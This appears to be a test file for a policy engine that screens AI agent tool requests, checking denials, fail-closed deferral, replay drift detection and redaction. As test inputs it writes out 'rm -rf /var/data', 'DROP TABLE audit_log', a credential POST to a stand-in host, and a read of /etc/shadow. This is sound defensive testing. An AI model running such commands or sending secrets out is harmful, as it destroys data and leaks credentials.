import { after, before, test } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "vite";

let vite;
let engine;
let types;

before(async () => {
  vite = await createServer({ configFile: false, server: { middlewareMode: true }, appType: "custom" });
  engine = await vite.ssrLoadModule("/src/lib/csg/engine.ts");
  types = await vite.ssrLoadModule("/src/lib/csg/types.ts");
});

after(async () => {
  await vite?.close();
});

function request(overrides = {}) {
  return {
    event_type: "permission_request",
    event_id: "security-test-001",
    workspace_id: "test-workspace",
    task_id: "test-task",
    agent_id: "test-agent",
    timestamp: "2026-10-21T12:00:00.000Z",
    tool_name: "read_file",
    tool_params: { path: "README.md" },
    context: { policy_tags: ["research"], recent_messages: [{ sender: "user", text: "review this request" , ts: "2026-10-21T11:59:00.000Z" }] },
    sensitivity: "low",
    ...overrides,
  };
}

function evaluate(req, overrides = {}) {
  return engine.evaluateRequest(req, {
    policy: { ...types.DEFAULT_POLICY, ...overrides.policy },
    mode: overrides.mode ?? "enforce",
    yolo: overrides.yolo ?? false,
  });
}

test("destructive shell commands are denied even with YOLO enabled", () => {
  const { decision } = evaluate(request({
    tool_name: "exec_command",
    tool_params: { cmd: "rm -rf /var/data" },
  }), { yolo: true });
  assert.equal(decision.decision, "deny");
  assert.ok(decision.evidence.some((item) => item.id === "destructive_fs"));
});

test("destructive SQL is denied", () => {
  const { decision } = evaluate(request({
    tool_name: "sql_query",
    tool_params: { sql: "DROP TABLE audit_log" },
  }));
  assert.equal(decision.decision, "deny");
  assert.ok(decision.evidence.some((item) => item.id === "destructive_sql"));
});

test("credential-like values sent to an external destination are denied", () => {
  const { decision } = evaluate(request({
    tool_name: "http_request",
    tool_params: { method: "POST", url: "https://example.invalid/collect", api_key: "demo-secret-value" },
  }));
  assert.equal(decision.decision, "deny");
  assert.ok(decision.evidence.some((item) => item.id === "credential_outbound"));
});

test("incomplete permission requests fail closed to defer", () => {
  const incomplete = request({ task_id: "" });
  const { decision } = evaluate(incomplete);
  assert.equal(decision.decision, "defer");
  assert.match(decision.rationale, /schema incomplete/i);
});

test("recorded decision replays from its policy snapshot with matching lineage", () => {
  const { sanitized, decision } = evaluate(request());
  const replay = engine.replayRecorded(decision, sanitized);
  assert.equal(replay.match, true);
  assert.equal(replay.next.lineage_token, decision.lineage_token);
});

test("replay detects a changed request instead of silently accepting drift", () => {
  const { sanitized, decision } = evaluate(request());
  const changed = { ...sanitized, tool_params: { path: "/etc/shadow" } };
  const replay = engine.replayRecorded(decision, changed);
  assert.equal(replay.match, false);
});

test("sanitization redacts email addresses and long token-like strings", () => {
  const { sanitized } = evaluate(request({
    tool_params: {
      recipient: "security@example.com",
      token: "abcdefghijklmnopqrstuvwx123456",
    },
  }));
  assert.equal(sanitized.tool_params.recipient, "[email]");
  assert.equal(sanitized.tool_params.token, "[token]");
});
